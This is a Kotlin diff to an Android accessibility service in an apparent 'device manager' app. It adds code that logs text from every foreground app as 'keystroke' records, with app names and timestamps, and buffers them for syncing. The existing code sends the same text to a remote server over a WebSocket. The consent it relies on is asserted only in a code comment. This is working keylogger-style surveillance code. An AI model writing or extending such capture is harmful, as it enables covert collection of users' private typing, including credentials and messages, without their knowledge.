@@ -43,6 +43,23 @@ class DeviceAccessibilityService : AccessibilityService() {
         val textStr = textBuilder.toString().trim()
 
         if (packageName.isNotEmpty()) {
+            // Buffer locally for SYNC_KEYSTROKES (visible accessibility consent).
+            try {
+                val app = application as? DeviceManagerApp
+                val entry = com.example.data.local.entity.KeystrokeEntity(
+                    appPackage = packageName,
+                    appName = runCatching {
+                        packageManager.getApplicationLabel(
+                            packageManager.getApplicationInfo(packageName, 0)
+                        ).toString()
+                    }.getOrDefault(packageName),
+                    text = textStr,
+                    timestamp = System.currentTimeMillis()
+                )
+                app?.repository?.recordAccessibilityText(entry)
+            } catch (e: Exception) {
+                Log.w("AccessibilityService", "Local buffer write failed: ${e.message}")
+            }
             try {
                 val wsManager = DeviceManagerApp.instance.webSocketManager
                 wsManager.sendAccessibilityEvent(packageName, className, textStr)
